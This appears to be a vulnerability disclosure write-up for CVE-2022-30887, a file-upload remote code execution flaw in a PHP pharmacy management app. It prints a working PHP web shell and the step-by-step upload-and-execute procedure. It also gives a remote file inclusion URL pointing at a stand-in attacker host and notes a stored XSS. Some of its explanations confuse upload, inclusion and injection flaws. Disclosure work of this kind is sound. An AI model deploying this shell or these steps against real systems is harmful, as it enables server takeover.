# CVE-2022-30887
## Pharmacy Management System 1.0 Shell Upload
This application built by [Mayurik](https://mayurik.com/)
Pharmacy management system project in PHP has been developed to improve the accuracy and efficiency of pharmaceutical stores through security and management. In short, it is a product inventory application.

Pharmacy Management System v1.0 was discovered to contain a remote code execution (RCE) vulnerability via the component "/php_action/editProductImage.php". This vulnerability allows attackers to execute arbitrary code via a crafted image file.

## What is a File Inclusion Attack
File Upload vulnerabilities are usually a vulnerability that allows a script to run. It works when we upload the file to the server and enter a command on the uploaded file. File upload vulnerabilities are divided into two types;
- **LFI** (Local File Inclusion)
- **RFI** (Remote File Inclusion)

### LFI (Local File Inclusion)
This vulnerability occurs when the local files on the server include the file retrieved from the user. values received from the user must be sterilized.

Example of **LFI (Local File Inclusion)** ;
```
<?php
if($_REQUEST['s'])
 {  
 system($_REQUEST['s']);
 } 
 else
  phpinfo();?>
```

### RFI (Remote File Inclusion)
This vulnerability works when the attacker upload malware from a remote server.

Example of **RFI (Remote File Inclusion)** ;

"www.victim_site.com/abc.php?test=http://www.attacker_site.com/attack_page"

## Explanation of exploit, PoC

- First, after the login page we will direct to "dashboar.php"
- Secondly, to go to the page where the vulnerability was found, click medicine on the menu after clicking manage medicine you will direct to "product.php" and click edit image under the action tab 

![Product](/images/Screenshot_6.jpg)

- In "editproduct.php" page, click select photo button and upload your shell script.

Example of php shell script;

```
<?php
if($_REQUEST['s'])
 {  
 system($_REQUEST['s']);
 } 
 else
  phpinfo();?>
```

- Click save button and catch the request on **burp suite**

Request;

![Request](/images/Screenshot_1.jpg)

Response;

![Response](/images/Screenshot_2.jpg)

- The file downloaded to "**/assets/myimage/**" folder
- Make request to run your script in url which is **/assets/myimage/shell.php?s=echo+%22MuallimNaci%22**

Request;

![Request](/images/Screenshot_3.jpg)

Response;

![Response](/images/Screenshot_4.jpg)

![Response](/images/Screenshot_8.jpg)

- And **BOOM** 

Also this vulnerability is still active on application.

## Mitigation

-  ensure you only accept characters such as "a-Z0-9" and do not allow ".." or "/" or "%00" (null byte)
- Be ensure "**allow_url_include flag**" must be **off**
- acording to owasp 10 Remediation; "Application can maintain a ***white list of files**, that may be included by the page, and then use an identifier (for example the index number) to access to the selected file. Any request containing an invalid identifier has to be rejected, in this way there is no attack surface for malicious users to manipulate the path"

## Extra
In the same page which is "editproduct.php", I found stored xss

- The code which include vulnerability is;
 ```
$sql = "UPDATE product SET product_name = '$productName'
```

In this code block you can go out of context with double quotes (")

### Request;

![Request](/images/xss/Screenshot_6.jpg)

### Response;

![Response](/images/xss/Screenshot_7.jpg)

![Response](/images/xss/Screenshot_8.jpg)

## Conclusion

I hope can tell how file inclusion vulnerability works, what or which situation trigger this vulnerability and how prevent this attack from attackers. Thanks for your precious time.

